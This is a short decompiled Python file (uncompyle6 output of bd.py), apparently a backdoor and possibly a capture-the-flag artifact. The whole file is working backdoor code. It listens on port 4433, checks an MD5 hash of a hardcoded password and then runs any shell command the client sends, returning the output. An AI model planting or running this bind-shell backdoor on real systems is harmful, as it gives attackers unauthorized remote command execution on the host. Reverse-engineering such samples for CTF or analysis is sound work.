# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.5 (default, Jul 28 2020, 12:59:40) 
# [GCC 9.3.0]
# Embedded file name: bd.py
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    client, addr = sock.accept()
    data = client.recv(32)
    if len(data) != 32:
        client.close()
    elif data.decode() != md5(b's4v3_th3_w0rld').hexdigest():
        client.send(b'Invalid')
        client.close()
    else:
        size = client.recv(1)
        command = client.recv(int.from_bytes(size, 'little'))
        if not command.startswith(b'command:'):
            client.close()
        else:
            command = command.replace(b'command:', b'')
            output = check_output(command, shell=True)
            client.send(output)
            client.close()
# okay decompiling bd.pyc
